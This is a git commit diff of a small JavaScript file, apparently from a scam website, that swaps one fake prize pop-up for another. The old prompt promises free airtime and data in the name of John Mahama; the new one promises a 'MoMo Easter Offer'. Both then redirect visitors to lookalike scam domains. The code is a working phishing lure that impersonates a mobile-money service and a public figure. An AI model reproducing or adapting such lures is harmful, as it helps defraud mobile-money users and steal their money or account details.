2bb538d53863e38ea44b426883b830443543d63e
lagboyme <lagboy33+me@gmail.com>
2025-04-18 01:49:41 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'GH₵200'
+password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive GH₵20 MoMo Easter Offer, Kindly Press OK to PROCEED ','GH₵200');
+if (password != 'GH₵200') {
+location.href='https://momo-reward.goprogram.xyz/easter';
 }
